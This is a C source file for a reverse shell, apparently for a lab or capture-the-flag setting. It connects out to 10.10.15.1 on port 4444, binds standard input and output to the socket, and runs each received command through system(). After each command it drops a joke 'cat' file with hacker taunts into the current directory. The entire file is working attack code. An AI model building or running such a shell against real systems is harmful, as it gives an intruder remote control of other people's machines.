#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <getopt.h> // For parsing command-line options

// --- Global Settings ---
// This flag controls whether cat files are dropped.
// 1 = on (default), 0 = off (disabled by -n)
static int g_cat_mode = 1; 

/**
 * @brief Drops a file with a random cat-themed payload into the CURRENT directory.
 */
void drop_random_cat_file(void) {
    // This function is unchanged, but is now controlled by g_cat_mode
    const char *payloads[] = {
        "  /\\_/\\\n ( o.o )\n  > ^ <",
        "Cat fact: \nCats sleep 12-16 hours/day.\nBut they meow meow meow meow meow",
        "soft paws in moonlight Meow\nsilent whiskers test the air Meow",
        "Freaky Kitty Sees you Meow",
        "Meow Me0w Cats can Hack too",
        "$cr1ptK1tt13$ was here MEow",
        "Meow MEow Meow me0w mow!",
        "Preaching to the MEOW MEOW!\nCan i Get the Meow a little MEOW MEOW!",
        "La $K1Dshell",
        "Straight up meowing my ware"
    };
    size_t n_payloads = sizeof(payloads)/sizeof(payloads[0]);

    char filename[256];
    time_t now = time(NULL);
    int r = rand() % 1000000;
    
    // Note: This writes to the current working directory, not random system paths.
    snprintf(filename, sizeof(filename), "cat_%ld_%06d.txt", (long)now, r);

    FILE *f = fopen(filename, "w");
    if (!f) {
        perror("fopen"); // Print an error if file creation fails
        return;
    }
    fprintf(f, "%s\n", payloads[rand() % n_payloads]);
    fclose(f);
}

/**
 * @brief Prints the help message and exits.
 * @param prog_name The name of the executable (from argv[0]).
 */
void show_help(const char *prog_name) {
    printf("Usage: %s [options]\n\n", prog_name);
    printf("A simple reverse shell example.\n\n");
    printf("Options:\n");
    printf("  -h, --help      Show this help message and exit.\n");
    printf("  -n, --no-cat    Disable the dropping of 'cat.txt' files.\n");
    // Add help for other options like port/ip if you parameterize them
}

/**
 * @brief Main function: parses args, connects, and runs command loop.
 */
int main(int argc, char *argv[]){
    // --- Argument Parsing ---
    int c;
    while (1) {
        static struct option long_options[] = {
            {"help",    no_argument, 0, 'h'},
            {"no-cat",  no_argument, 0, 'n'},
            {0, 0, 0, 0} // End of options
        };
        int option_index = 0;

        c = getopt_long(argc, argv, "hn", long_options, &option_index);

        // Detect the end of the options
        if (c == -1)
            break;

        switch (c) {
            case 'h': // Help flag
                show_help(argv[0]);
                return 0; // Exit gracefully
            case 'n': // No-cat flag
                g_cat_mode = 0; // Disable cat file dropping
                break;
            case '?': // Unknown option
                // getopt_long already printed an error message.
                return 1; // Exit with error
            default:
                abort();
        }
    }
    
    // --- Reverse Shell Logic ---
    int port = 4444; //change me
    struct sockaddr_in revsockaddr;
    int sockt = socket(AF_INET, SOCK_STREAM, 0);

    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.15.1"); //change me

    if (connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) != 0) {
        perror("connect");
        return 1; // Exit if connection fails
    }

    // Redirect stdin, stdout, stderr
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    // Seed RNG
    srand(time(NULL) ^ getpid());

    // --- Command Loop ---
    printf("Connected. Type 'exit' to quit.\n"); // This goes to the socket
    fflush(stdout);

    char cmd[512];
    while (1) {
        memset(cmd, 0, sizeof(cmd));
        
        // Read command from socket (stdin)
        if (fgets(cmd, sizeof(cmd), stdin) == NULL) {
            break; // Connection closed
        }

        // remove newline
        cmd[strcspn(cmd, "\n")] = 0;

        if (strlen(cmd) == 0) continue;
        if (strcmp(cmd, "exit") == 0) break;

        system(cmd);          // Run the command
        fflush(stdout); // Ensure all output is sent
        fflush(stderr);
        
        // Only drop cat file if mode is enabled
        if (g_cat_mode) {
            drop_random_cat_file(); 
        }
    }

    close(sockt);
    return 0;
}
